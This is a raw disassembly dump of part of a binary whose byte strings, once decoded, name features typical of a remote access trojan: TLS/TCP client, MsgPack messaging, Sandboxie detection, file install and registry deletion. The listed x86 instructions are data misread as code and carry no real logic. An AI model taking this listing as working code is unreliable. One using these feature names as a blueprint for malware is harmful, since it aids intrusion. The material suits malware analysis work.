  407c84:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c8b:	73 6c                	jae    0x407cf9
  407c8d:	43                   	inc    %ebx
  407c8e:	6c                   	insb   (%dx),%es:(%edi)
  407c8f:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c96:	5f                   	pop    %edi
  407c97:	42                   	inc    %edx
  407c98:	61                   	popa
  407c99:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c9c:	6e                   	outsb  %ds:(%esi),(%dx)
  407c9d:	67 46                	addr16 inc %esi
  407c9f:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407ca6:	63 70 43             	arpl   %esi,0x43(%eax)
  407ca9:	6c                   	insb   (%dx),%es:(%edi)
  407caa:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cb1:	5f                   	pop    %edi
  407cb2:	42                   	inc    %edx
  407cb3:	61                   	popa
  407cb4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cb7:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb8:	67 46                	addr16 inc %esi
  407cba:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc2:	65 72 41             	gs jb  0x407d06
  407cc5:	64 64 4d             	fs fs dec %ebp
  407cc8:	61                   	popa
  407cc9:	70 43                	jo     0x407d0e
  407ccb:	68 69 6c 64 00       	push   $0x646c69
  407cd0:	49                   	dec    %ecx
  407cd1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd3:	65 72 41             	gs jb  0x407d17
  407cd6:	64 64 41             	fs fs inc %ecx
  407cd9:	72 72                	jb     0x407d4d
  407cdb:	61                   	popa
  407cdc:	79 43                	jns    0x407d21
  407cde:	68 69 6c 64 00       	push   $0x646c69
  407ce3:	68 57 6e 64 00       	push   $0x646e57
  407ce8:	53                   	push   %ebx
  407ce9:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ceb:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407cef:	70 65                	jo     0x407d56
  407cf1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf2:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cf6:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cfd:	61 
  407cfe:	6c                   	insb   (%dx),%es:(%edi)
  407cff:	75 65                	jne    0x407d66
  407d01:	4b                   	dec    %ebx
  407d02:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d09:	6c                   	insb   (%dx),%es:(%edi)
  407d0a:	61                   	popa
  407d0b:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d0e:	43                   	inc    %ebx
  407d0f:	72 65                	jb     0x407d76
  407d11:	61                   	popa
  407d12:	74 65                	je     0x407d79
  407d14:	49                   	dec    %ecx
  407d15:	6e                   	outsb  %ds:(%esi),(%dx)
  407d16:	73 74                	jae    0x407d8c
  407d18:	61                   	popa
  407d19:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1a:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d1d:	73 65                	jae    0x407d84
  407d1f:	74 5f                	je     0x407d80
  407d21:	4d                   	dec    %ebp
  407d22:	6f                   	outsl  %ds:(%esi),(%dx)
  407d23:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d28:	6c                   	insb   (%dx),%es:(%edi)
  407d29:	65 4d                	gs dec %ebp
  407d2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2c:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d31:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d38:	64 65 
  407d3a:	00 45 6e             	add    %al,0x6e(%ebp)
  407d3d:	74 65                	je     0x407da4
  407d3f:	72 44                	jb     0x407d85
  407d41:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d45:	4d                   	dec    %ebp
  407d46:	6f                   	outsl  %ds:(%esi),(%dx)
  407d47:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d4c:	79 70                	jns    0x407dbe
  407d4e:	74 6f                	je     0x407dbf
  407d50:	53                   	push   %ebx
  407d51:	74 72                	je     0x407dc5
  407d53:	65 61                	gs popa
  407d55:	6d                   	insl   (%dx),%es:(%edi)
  407d56:	4d                   	dec    %ebp
  407d57:	6f                   	outsl  %ds:(%esi),(%dx)
  407d58:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d5d:	6d                   	insl   (%dx),%es:(%edi)
  407d5e:	70 72                	jo     0x407dd2
  407d60:	65 73 73             	gs jae 0x407dd6
  407d63:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d6a:	00 43 69             	add    %al,0x69(%ebx)
  407d6d:	70 68                	jo     0x407dd7
  407d6f:	65 72 4d             	gs jb  0x407dbf
  407d72:	6f                   	outsl  %ds:(%esi),(%dx)
  407d73:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d78:	6c                   	insb   (%dx),%es:(%edi)
  407d79:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d7e:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d83:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d87:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d8a:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d8f:	65 74 65             	gs je  0x407df7
  407d92:	53                   	push   %ebx
  407d93:	75 62                	jne    0x407df7
  407d95:	4b                   	dec    %ebx
  407d96:	65 79 54             	gs jns 0x407ded
  407d99:	72 65                	jb     0x407e00
  407d9b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d9f:	74 5f                	je     0x407e00
  407da1:	4d                   	dec    %ebp
  407da2:	65 73 73             	gs jae 0x407e18
  407da5:	61                   	popa
  407da6:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407dab:	74 65                	je     0x407e12
  407dad:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407db1:	6e                   	outsb  %ds:(%esi),(%dx)
  407db2:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407db6:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dbd:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dc1:	45                   	inc    %ebp
  407dc2:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc3:	75 6d                	jne    0x407e32
  407dc5:	65 72 61             	gs jb  0x407e29
  407dc8:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dcc:	49                   	dec    %ecx
  407dcd:	44                   	inc    %esp
  407dce:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dd5:	6c                   	insb   (%dx),%es:(%edi)
  407dd6:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407ddb:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddc:	75 62                	jne    0x407e40
  407dde:	6c                   	insb   (%dx),%es:(%edi)
  407ddf:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407de3:	61                   	popa
  407de4:	70 44                	jo     0x407e2a
  407de6:	6f                   	outsl  %ds:(%esi),(%dx)
  407de7:	75 62                	jne    0x407e4b
  407de9:	6c                   	insb   (%dx),%es:(%edi)
  407dea:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407dee:	74 5f                	je     0x407e4f
  407df0:	48                   	dec    %eax
  407df1:	61                   	popa
  407df2:	6e                   	outsb  %ds:(%esi),(%dx)
  407df3:	64 6c                	fs insb (%dx),%es:(%edi)
  407df5:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407df9:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfa:	74 69                	je     0x407e65
  407dfc:	6d                   	insl   (%dx),%es:(%edi)
  407dfd:	65 46                	gs inc %esi
  407dff:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e06:	64 6c                	fs insb (%dx),%es:(%edi)
  407e08:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e0c:	74 4d                	je     0x407e5b
  407e0e:	6f                   	outsl  %ds:(%esi),(%dx)
  407e0f:	64 75 6c             	fs jne 0x407e7e
  407e12:	65 48                	gs dec %eax
  407e14:	61                   	popa
  407e15:	6e                   	outsb  %ds:(%esi),(%dx)
  407e16:	64 6c                	fs insb (%dx),%es:(%edi)
  407e18:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e1d:	74 69                	je     0x407e88
  407e1f:	6d                   	insl   (%dx),%es:(%edi)
  407e20:	65 54                	gs push %esp
  407e22:	79 70                	jns    0x407e94
  407e24:	65 48                	gs dec %eax
  407e26:	61                   	popa
  407e27:	6e                   	outsb  %ds:(%esi),(%dx)
  407e28:	64 6c                	fs insb (%dx),%es:(%edi)
  407e2a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e2e:	74 54                	je     0x407e84
  407e30:	79 70                	jns    0x407ea2
  407e32:	65 46                	gs inc %esi
  407e34:	72 6f                	jb     0x407ea5
  407e36:	6d                   	insl   (%dx),%es:(%edi)
  407e37:	48                   	dec    %eax
  407e38:	61                   	popa
  407e39:	6e                   	outsb  %ds:(%esi),(%dx)
  407e3a:	64 6c                	fs insb (%dx),%es:(%edi)
  407e3c:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e40:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e47:	65 
  407e48:	00 57 72             	add    %dl,0x72(%edi)
  407e4b:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e52:	6c 
  407e53:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e58:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e5f:	65 74 41             	gs je  0x407ea3
  407e62:	73 53                	jae    0x407eb7
  407e64:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e6b:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6c:	73 74                	jae    0x407ee2
  407e6e:	61                   	popa
  407e6f:	6c                   	insb   (%dx),%es:(%edi)
  407e70:	6c                   	insb   (%dx),%es:(%edi)
  407e71:	46                   	inc    %esi
  407e72:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e79:	6f 
  407e7a:	64 65 46             	fs gs inc %esi
  407e7d:	72 6f                	jb     0x407eee
  407e7f:	6d                   	insl   (%dx),%es:(%edi)
  407e80:	46                   	inc    %esi
  407e81:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e88:	65 
  407e89:	42                   	inc    %edx
  407e8a:	79 74                	jns    0x407f00
  407e8c:	65 73 54             	gs jae 0x407ee3
  407e8f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e90:	46                   	inc    %esi
  407e91:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e98:	6e 
  407e99:	52                   	push   %edx
  407e9a:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9b:	6c                   	insb   (%dx),%es:(%edi)
  407e9c:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407ea0:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea1:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ea3:	77 73                	ja     0x407f18
  407ea5:	42                   	inc    %edx
  407ea6:	75 69                	jne    0x407f11
  407ea8:	6c                   	insb   (%dx),%es:(%edi)
  407ea9:	74 49                	je     0x407ef4
  407eab:	6e                   	outsb  %ds:(%esi),(%dx)
  407eac:	52                   	push   %edx
  407ead:	6f                   	outsl  %ds:(%esi),(%dx)
  407eae:	6c                   	insb   (%dx),%es:(%edi)
  407eaf:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eb3:	74 41                	je     0x407ef6
  407eb5:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eb9:	65 57                	gs push %edi
  407ebb:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ec2:	74 6c                	je     0x407f30
  407ec4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec8:	74 5f                	je     0x407f29
  407eca:	4d                   	dec    %ebp
  407ecb:	61                   	popa
  407ecc:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ed3:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ed7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed8:	63 65 73             	arpl   %esp,0x73(%ebp)
  407edb:	73 4d                	jae    0x407f2a
  407edd:	6f                   	outsl  %ds:(%esi),(%dx)
  407ede:	64 75 6c             	fs jne 0x407f4d
  407ee1:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ee5:	74 5f                	je     0x407f46
  407ee7:	57                   	push   %edi
  407ee8:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407eef:	79 6c                	jns    0x407f5d
  407ef1:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ef5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef6:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ef9:	73 57                	jae    0x407f52
  407efb:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f02:	79 6c                	jns    0x407f70
  407f04:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f08:	74 5f                	je     0x407f69
  407f0a:	4e                   	dec    %esi
  407f0b:	61                   	popa
  407f0c:	6d                   	insl   (%dx),%es:(%edi)
  407f0d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f11:	74 5f                	je     0x407f72
  407f13:	46                   	inc    %esi
  407f14:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f1b:	00 
  407f1c:	73 65                	jae    0x407f83
  407f1e:	74 5f                	je     0x407f7f
  407f20:	46                   	inc    %esi
  407f21:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f28:	00 
  407f29:	47                   	inc    %edi
  407f2a:	65 74 54             	gs je  0x407f81
  407f2d:	65 6d                	gs insl (%dx),%es:(%edi)
  407f2f:	70 46                	jo     0x407f77
  407f31:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f38:	00 
  407f39:	47                   	inc    %edi
  407f3a:	65 74 46             	gs je  0x407f83
  407f3d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f44:	00 
  407f45:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f4c:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f51:	6f                   	outsl  %ds:(%esi),(%dx)
  407f52:	64 75 6c             	fs jne 0x407fc1
  407f55:	65 4e                	gs dec %esi
  407f57:	61                   	popa
  407f58:	6d                   	insl   (%dx),%es:(%edi)
  407f59:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f5d:	74 5f                	je     0x407fbe
  407f5f:	4d                   	dec    %ebp
  407f60:	61                   	popa
  407f61:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f64:	6e                   	outsb  %ds:(%esi),(%dx)
  407f65:	65 4e                	gs dec %esi
  407f67:	61                   	popa
  407f68:	6d                   	insl   (%dx),%es:(%edi)
  407f69:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f6d:	74 5f                	je     0x407fce
  407f6f:	4f                   	dec    %edi
  407f70:	53                   	push   %ebx
  407f71:	46                   	inc    %esi
  407f72:	75 6c                	jne    0x407fe0
  407f74:	6c                   	insb   (%dx),%es:(%edi)
  407f75:	4e                   	dec    %esi
  407f76:	61                   	popa
  407f77:	6d                   	insl   (%dx),%es:(%edi)
  407f78:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f7c:	74 5f                	je     0x407fdd
  407f7e:	46                   	inc    %esi
  407f7f:	75 6c                	jne    0x407fed
  407f81:	6c                   	insb   (%dx),%es:(%edi)
  407f82:	4e                   	dec    %esi
  407f83:	61                   	popa
  407f84:	6d                   	insl   (%dx),%es:(%edi)
  407f85:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f89:	56                   	push   %esi
  407f8a:	61                   	popa
  407f8b:	6c                   	insb   (%dx),%es:(%edi)
  407f8c:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f93:	6e 
  407f94:	4e                   	dec    %esi
  407f95:	61                   	popa
  407f96:	6d                   	insl   (%dx),%es:(%edi)
  407f97:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f9b:	74 5f                	je     0x407ffc
  407f9d:	55                   	push   %ebp
  407f9e:	73 65                	jae    0x408005
  407fa0:	72 4e                	jb     0x407ff0
  407fa2:	61                   	popa
  407fa3:	6d                   	insl   (%dx),%es:(%edi)
  407fa4:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fa9:	65 72 4e             	gs jb  0x407ffa
  407fac:	61                   	popa
  407fad:	6d                   	insl   (%dx),%es:(%edi)
  407fae:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fb2:	74 4e                	je     0x408002
  407fb4:	61                   	popa
  407fb5:	6d                   	insl   (%dx),%es:(%edi)
  407fb6:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fba:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  407fbf:	73 74                	jae    0x408035
  407fc1:	4e                   	dec    %esi
  407fc2:	61                   	popa
  407fc3:	6d                   	insl   (%dx),%es:(%edi)
  407fc4:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc8:	6d                   	insl   (%dx),%es:(%edi)
  407fc9:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fce:	65 54                	gs push %esp
  407fd0:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fd7:	5f                   	pop    %edi
  407fd8:	4c                   	dec    %esp
  407fd9:	61                   	popa
  407fda:	73 74                	jae    0x408050
  407fdc:	57                   	push   %edi
  407fdd:	72 69                	jb     0x408048
  407fdf:	74 65                	je     0x408046
  407fe1:	54                   	push   %esp
  407fe2:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fe9:	6e                   	outsb  %ds:(%esi),(%dx)
  407fea:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407ff1:	54                   	push   %esp
  407ff2:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ff9:	74 65                	je     0x408060
  407ffb:	4c                   	dec    %esp
  407ffc:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408003:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408006:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40800a:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408011:	6d                   	insl   (%dx),%es:(%edi)
  408012:	65 54                	gs push %esp
  408014:	79 70                	jns    0x408086
  408016:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40801a:	74 5f                	je     0x40807b
  40801c:	56                   	push   %esi
  40801d:	61                   	popa
  40801e:	6c                   	insb   (%dx),%es:(%edi)
  40801f:	75 65                	jne    0x408086
  408021:	54                   	push   %esp
  408022:	79 70                	jns    0x408094
  408024:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408028:	6c                   	insb   (%dx),%es:(%edi)
  408029:	75 65                	jne    0x408090
  40802b:	54                   	push   %esp
  40802c:	79 70                	jns    0x40809e
  40802e:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  408032:	67 50                	addr16 push %eax
  408034:	61                   	popa
  408035:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408038:	79 70                	jns    0x4080aa
  40803a:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40803e:	6f                   	outsl  %ds:(%esi),(%dx)
  40803f:	74 6f                	je     0x4080b0
  408041:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408044:	54                   	push   %esp
  408045:	79 70                	jns    0x4080b7
  408047:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40804b:	74 54                	je     0x4080a1
  40804d:	79 70                	jns    0x4080bf
  40804f:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408053:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408056:	74 54                	je     0x4080ac
  408058:	79 70                	jns    0x4080ca
  40805a:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40805e:	6c                   	insb   (%dx),%es:(%edi)
  40805f:	65 53                	gs push %ebx
  408061:	68 61 72 65 00       	push   $0x657261
  408066:	53                   	push   %ebx
  408067:	79 73                	jns    0x4080dc
  408069:	74 65                	je     0x4080d0
  40806b:	6d                   	insl   (%dx),%es:(%edi)
  40806c:	2e 43                	cs inc %ebx
  40806e:	6f                   	outsl  %ds:(%esi),(%dx)
  40806f:	72 65                	jb     0x4080d6
  408071:	00 53 65             	add    %dl,0x65(%ebx)
  408074:	72 76                	jb     0x4080ec
  408076:	65 72 73             	gs jb  0x4080ec
  408079:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408080:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  408084:	6f                   	outsl  %ds:(%esi),(%dx)
  408085:	73 65                	jae    0x4080ec
  408087:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40808b:	70 6f                	jo     0x4080fc
  40808d:	73 65                	jae    0x4080f4
  40808f:	00 50 61             	add    %dl,0x61(%eax)
  408092:	72 73                	jb     0x408107
  408094:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408098:	72 52                	jb     0x4080ec
  40809a:	65 76 65             	gs jbe 0x408102
  40809d:	72 73                	jb     0x408112
  40809f:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080a3:	30 39                	xor    %bh,(%ecx)
  4080a5:	43                   	inc    %ebx
  4080a6:	65 72 74             	gs jb  0x40811d
  4080a9:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080b0:	00 56 61             	add    %dl,0x61(%esi)
  4080b3:	6c                   	insb   (%dx),%es:(%edi)
  4080b4:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080bb:	72 
  4080bc:	76 65                	jbe    0x408123
  4080be:	72 43                	jb     0x408103
  4080c0:	65 72 74             	gs jb  0x408137
  4080c3:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080ca:	00 63 65             	add    %ah,0x65(%ebx)
  4080cd:	72 74                	jb     0x408143
  4080cf:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d6:	00 43 72             	add    %al,0x72(%ebx)
  4080d9:	65 61                	gs popa
  4080db:	74 65                	je     0x408142
  4080dd:	00 53 65             	add    %dl,0x65(%ebx)
  4080e0:	74 54                	je     0x408136
  4080e2:	68 72 65 61 64       	push   $0x64616572
  4080e7:	45                   	inc    %ebp
  4080e8:	78 65                	js     0x40814f
  4080ea:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080ed:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080f4:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080f9:	65 74 65             	gs je  0x408161
  4080fc:	00 43 61             	add    %al,0x61(%ebx)
  4080ff:	6c                   	insb   (%dx),%es:(%edi)
  408100:	6c                   	insb   (%dx),%es:(%edi)
  408101:	53                   	push   %ebx
  408102:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408109:	74 
  40810a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40810e:	6d                   	insl   (%dx),%es:(%edi)
  40810f:	70 69                	jo     0x40817a
  408111:	6c                   	insb   (%dx),%es:(%edi)
  408112:	65 72 47             	gs jb  0x40815c
  408115:	65 6e                	outsb  %gs:(%esi),(%dx)
  408117:	65 72 61             	gs jb  0x40817b
  40811a:	74 65                	je     0x408181
  40811c:	64 41                	fs inc %ecx
  40811e:	74 74                	je     0x408194
  408120:	72 69                	jb     0x40818b
  408122:	62 75 74             	bound  %esi,0x74(%ebp)
  408125:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40812a:	75 67                	jne    0x408193
  40812c:	67 61                	addr16 popa
  40812e:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408132:	74 74                	je     0x4081a8
  408134:	72 69                	jb     0x40819f
  408136:	62 75 74             	bound  %esi,0x74(%ebp)
  408139:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40813d:	6d                   	insl   (%dx),%es:(%edi)
  40813e:	56                   	push   %esi
  40813f:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408146:	74 74                	je     0x4081bc
  408148:	72 69                	jb     0x4081b3
  40814a:	62 75 74             	bound  %esi,0x74(%ebp)
  40814d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408151:	73 65                	jae    0x4081b8
  408153:	6d                   	insl   (%dx),%es:(%edi)
  408154:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408158:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40815f:	72 
  408160:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408167:	73 73                	jae    0x4081dc
  408169:	65 6d                	gs insl (%dx),%es:(%edi)
  40816b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40816f:	72 61                	jb     0x4081d2
  408171:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408174:	61                   	popa
  408175:	72 6b                	jb     0x4081e2
  408177:	41                   	inc    %ecx
  408178:	74 74                	je     0x4081ee
  40817a:	72 69                	jb     0x4081e5
  40817c:	62 75 74             	bound  %esi,0x74(%ebp)
  40817f:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408184:	67 65 74 46          	addr16 gs je 0x4081ce
  408188:	72 61                	jb     0x4081eb
  40818a:	6d                   	insl   (%dx),%es:(%edi)
  40818b:	65 77 6f             	gs ja  0x4081fd
  40818e:	72 6b                	jb     0x4081fb
  408190:	41                   	inc    %ecx
  408191:	74 74                	je     0x408207
  408193:	72 69                	jb     0x4081fe
  408195:	62 75 74             	bound  %esi,0x74(%ebp)
  408198:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40819c:	73 65                	jae    0x408203
  40819e:	6d                   	insl   (%dx),%es:(%edi)
  40819f:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081a3:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081aa:	69 
  4081ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ad:	41                   	inc    %ecx
  4081ae:	74 74                	je     0x408224
  4081b0:	72 69                	jb     0x40821b
  4081b2:	62 75 74             	bound  %esi,0x74(%ebp)
  4081b5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081b9:	73 65                	jae    0x408220
  4081bb:	6d                   	insl   (%dx),%es:(%edi)
  4081bc:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c2:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c8:	74 69                	je     0x408233
  4081ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4081cc:	41                   	inc    %ecx
  4081cd:	74 74                	je     0x408243
  4081cf:	72 69                	jb     0x40823a
  4081d1:	62 75 74             	bound  %esi,0x74(%ebp)
  4081d4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d8:	73 65                	jae    0x40823f
  4081da:	6d                   	insl   (%dx),%es:(%edi)
  4081db:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081df:	65 73 63             	gs jae 0x408245
  4081e2:	72 69                	jb     0x40824d
  4081e4:	70 74                	jo     0x40825a
  4081e6:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081ed:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081f4:	65 66 61             	gs popaw
  4081f7:	75 6c                	jne    0x408265
  4081f9:	74 4d                	je     0x408248
  4081fb:	65 6d                	gs insl (%dx),%es:(%edi)
